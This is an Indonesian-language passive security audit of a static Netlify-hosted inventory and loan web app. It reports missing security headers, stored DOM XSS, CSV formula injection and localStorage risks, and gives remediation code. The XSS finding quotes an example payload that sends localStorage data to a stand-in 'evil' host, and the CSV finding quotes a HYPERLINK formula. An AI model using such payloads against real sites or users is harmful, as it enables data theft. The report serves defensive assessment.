# Audit & Security Assessment — pinzup.asia

**Tanggal:** 2026-10-18
**Target:** https://pinzup.asia/ (dan sub-halaman `/inventaris`, `/peminjaman`, `/riwayat`)
**Metode:** Passive / non-intrusive reconnaissance (header, TLS, konten publik, review kode client-side).
**Catatan legal:** Tidak ada pengujian eksploitasi aktif, brute-force, injeksi, atau DoS. Pengujian aktif hanya boleh dilakukan dengan izin tertulis dari pemilik. Semua temuan di bawah berasal dari data yang tersedia untuk pengunjung biasa.

---

## 1. Ringkasan Eksekutif

Pinzup adalah **aplikasi web frontend-only (client-side murni)** yang di-host statis di **Netlify**. Tidak ada backend/API, tidak ada autentikasi, dan seluruh data (inventaris, peminjaman, riwayat) disimpan di **`localStorage` browser** pengguna.

Konsekuensinya:
- **Permukaan serangan server sangat kecil** — tidak ada SQLi, SSRF, IDOR, RCE, atau auth-bypass karena memang tidak ada server aplikasi.
- **Tidak ada login sama sekali.** "Buka Aplikasi" langsung masuk dashboard.
- **Data tidak dibagikan antar pengguna.** Setiap browser punya datanya sendiri. Ini terlihat seperti *demo/prototipe*, bukan sistem multi-user produksi.
- Risiko utama ada di **sisi client**: DOM XSS tersimpan, CSV Injection, dan ketergantungan penuh pada `localStorage` (risiko kehilangan data).

**Overall posture: BAIK untuk server/infra, LEMAH pada lapisan aplikasi & praktik keamanan web (header, sanitasi, auth).**

---

## 2. Informasi Teknis Terverifikasi

| Item | Nilai |
|---|---|
| DNS A | 52.74.6.109, 13.215.239.219 (AWS, region Singapura) |
| Hosting | Netlify (`Server: Netlify`, `X-Nf-Request-Id`, `Cache-Status: "Netlify Edge"`) |
| TLS | Let's Encrypt (`CN=pinzup.asia`, issuer `YE1`), valid s/d 2027-01-03, SAN `*.pinzup.asia`, `pinzup.asia` |
| HTTP→HTTPS | 301 redirect ke HTTPS ✅ |
| www | 301 redirect ke apex ✅ |
| Aplikasi | HTML + CSS + JS statis; state via `data.js` → `localStorage` |
| Endpoint integrasi | `fonts.googleapis.com` (Google Fonts) |
| File app | `index.html`, `style.css` (37 KB), `data.js` (8.8 KB), `inventaris.html` (18.6 KB), `peminjaman.html` (19.3 KB), `riwayat.html` (5.9 KB), `logo.svg` |
| Tidak ada | `robots.txt`, `sitemap.xml`, `.well-known/security.txt`, `netlify.toml`, `_headers`, `_redirects` |

---

## 3. Header Keamanan (Security Headers)

Response header yang **ada**:
```
strict-transport-security: max-age=31536000
cache-control: public,max-age=0,must-revalidate
```
Response header yang **TIDAK ADA** (temuan):

| Header | Status | Dampak |
|---|---|---|
| `Content-Security-Policy` | ❌ Absen | Tidak ada pertahanan berlapis terhadap XSS/injeksi resource |
| `X-Frame-Options` / `frame-ancestors` | ❌ Absen | Situs bisa di-iframe → potensi clickjacking |
| `X-Content-Type-Options: nosniff` | ❌ Absen | MIME sniffing |
| `Referrer-Policy` | ❌ Absen | URL bisa bocor ke pihak ketiga |
| `Permissions-Policy` | ❌ Absen | Fitur browser tidak dibatasi |
| HSTS `includeSubDomains` / `preload` | ❌ Absen | Subdomain tidak terlindungi dari downgrade |

### Temuan SH-1 — Tidak ada Content-Security-Policy (Medium)
Tidak ada CSP sehingga jika ada jalur injeksi HTML, eksekusi script tidak terhalang.

### Temuan SH-2 — Tidak ada anti-framing (Low)
Tidak ada `X-Frame-Options`/`frame-ancestors`. Aplikasi bisa dibingkai di situs lain.

### Temuan SH-3 — HSTS belum includeSubDomains/preload (Low/Info)
`max-age=31536000` sudah bagus, tapi subdomain belum tercakup.

**Rekomendasi** — tambahkan `netlify.toml`:
```toml
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:; object-src 'none'; base-uri 'self'; frame-ancestors 'none'"
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=(), payment=(), usb=()"
    Strict-Transport-Security = "max-age=63072000; includeSubDomains; preload"
```
> Catatan: CSP di atas masih memakai `'unsafe-inline'` karena banyak handler `onclick=` & `<style>` inline. Untuk CSP ketat, refactor handler inline ke `addEventListener` terlebih dahulu.

---

## 4. Temuan Aplikasi

### APP-1 — DOM XSS tersimpan (Stored DOM XSS) via `innerHTML` (Medium)
Input pengguna (`nama`, `ket`, `kontak`, `catatan`) disimpan ke `localStorage` lalu dirender langsung ke `innerHTML` **tanpa escaping**.

Contoh di `inventaris.html`:
```js
grid.innerHTML = list.map(b => `
  <div class="inv-name" title="${b.nama}">${b.nama}</div>
  <div class="inv-meta">${b.kat}${b.ket ? ' · ' + b.ket.slice(0,28) : ''}</div>
  ...`);
```
Input seperti `"><img src=x onerror="fetch('//evil/'+localStorage.pinzupPinj)">` akan tereksekusi. `data.js` juga merender `p.nama`, `r.teks` (riwayat) dengan pola sama — termasuk `loan.nama`.

**Dampak:** Terbatas (data hanya di browser pengguna yang sama), tetapi:
- Bisa diekskalasi bila fitur berbagi/impor data antar pengguna ditambahkan, atau bila ada beberapa orang memakai profil browser yang sama (mis. komputer bersama).
- Payload bisa membaca seluruh isi `localStorage` (data inventaris/peminjam).

**Perbaikan:** escape semua interpolasi. Cukup satu helper:
```js
const esc = s => String(s ?? '').replace(/[&<>"']/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
// pakai: ${esc(b.nama)} , title="${esc(b.nama)}"
```
Atau gunakan `textContent` untuk node teks alih-alih string HTML.

### APP-2 — CSV / Formula Injection saat Export (Medium)
`data.js → exportCSV()` menulis nilai mentah ke CSV tanpa menyaring karakter berbahaya:
```js
csv += `${p.id},"${p.nama}","${p.kontak || ''}",...`;
```
Nilai diawali `=`, `+`, `-`, atau `@` (mis. nama `=HYPERLINK("http://evil","klik")`) akan dieksekusi sebagai formula saat file dibuka di Excel/Google Sheets (exfiltration / code exec pada spreadsheet).

**Perbaikan:** prefix nilai berbahaya dengan `'` dan bungkus dengan quote:
```js
const csvEsc = v => { v = String(v ?? ''); if (/^[=+\-@\t\r]/.test(v)) v = "'" + v; return '"' + v.replace(/"/g,'""') + '"'; };
```

### APP-3 — Tidak ada Autentikasi / Otorisasi (Info — by design?)
`masukDashboard()` langsung membuka dashboard tanpa login. Karena data bersifat lokal per-browser, tidak ada kebocoran lintas pengguna — tetapi ini **bukan sistem terproteksi**. Jika tujuannya aplikasi produksi multi-user, ini blocker kritis.

### APP-4 — Ketergantungan pada `localStorage` → Risiko Integritas & Ketersediaan (Medium)
- Menghapus cache/data situs = **seluruh data hilang permanen** (tidak ada backup/server).
- Gambar diunggah sebagai **base64 di `localStorage`** (limit ~5–10 MB). Beberapa gambar 2 MB bisa memicu `QuotaExceededError` dan menghentikan penyimpanan (DoS-sendiri).
- Data tidak tersinkron antar perangkat.

**Perbaikan:** gunakan IndexedDB untuk gambar/blob, tambahkan export/import JSON sebagai backup, dan tangani error kuota.

### APP-5 — Data disimpan antah-berantah & mudah dimanipulasi (Low/Info)
`localStorage` dapat diubah manual lewat DevTools (integritas tak terjaga). Hanya relevan jika data dianggap otoritatif.

---

## 5. Yang Sudah Baik

- ✅ HTTPS wajib dengan redirect 301 dari HTTP dan www.
- ✅ Sertifikat TLS valid (Let's Encrypt), cakupan wildcard.
- ✅ HSTS aktif (`max-age=31536000`).
- ✅ Hosting/CDN Netlify (mitigasi DDoS dasar, edge cache).
- ✅ Tanpa backend → tidak ada endpoint untuk SQLi/SSRF/RCE/auth-bypass.
- ✅ Tidak ada file sensitif terekspos (`.env`, `.git/config`, `package.json`, `netlify.toml` = 404).
- ✅ Tidak ada cookie sama sekali → tidak ada masalah flag `Secure`/`HttpOnly`/`SameSite`.
- ✅ Tidak ada data pribadi pengguna yang bocor dari halaman publik.

---

## 6. Info-Level / Kebersihan

- `robots.txt` & `sitemap.xml` tidak ada (404). Untuk situs publik sebaiknya ditambahkan agar crawl terkelola.
- `.well-known/security.txt` tidak ada — disarankan untuk kontak pelaporan kerentanan.
- Memuat Google Fonts dari `fonts.googleapis.com` (pihak ketiga) — pertimbangkan self-host demi privasi/performansi.
- `/.git/config` 404 ✅ (tidak ada kebocoran repo).

---

## 7. Daftar Prioritas Perbaikan

| # | Temuan | Severity | Aksi |
|---|---|---|---|
| 1 | DOM XSS tersimpan (`innerHTML`) | Medium | Escape output / pakai `textContent` |
| 2 | CSV/Formula Injection | Medium | Sanitasi sel CSV |
| 3 | Data hanya di `localStorage` (data-loss & quota) | Medium | IndexedDB + export/import backup |
| 4 | CSP absen | Medium | Tambah CSP via `netlify.toml` |
| 5 | Header keamanan lain absen | Low | X-Frame-Options, nosniff, Referrer-Policy, Permissions-Policy |
| 6 | HSTS belum includeSubDomains/preload | Low | Perbarui HSTS |
| 7 | Tanpa auth | Info/by-design | Tambah auth jika dipakai multi-user |
| 8 | robots/sitemap/security.txt absen | Info | Tambahkan |

---

## 8. Kesimpulan

Secara **infrastruktur, pinzup.asia aman**: HTTPS + TLS valid + HSTS + CDN, tanpa backend sehingga sebagian besar kelas kerentanan server tidak berlaku. Kelemahannya ada di **kualitas aplikasi & hardening web**: tidak ada CSP/header proteksi lain, terdapat **DOM XSS tersimpan** dan **CSV injection** dari data yang dirender tanpa escaping, serta model penyimpanan `localStorage` yang rawan kehilangan data. Semua temuan dapat diperbaiki tanpa mengubah arsitektur (tambah `netlify.toml` + helper escaping pada `data.js`/halaman).

> Laporan ini hanya mencakup pengujian pasif. Pengujian eksploitasi aktif (fuzzing, injeksi, auth attack) **tidak dilakukan** dan memerlukan otorisasi tertulis.
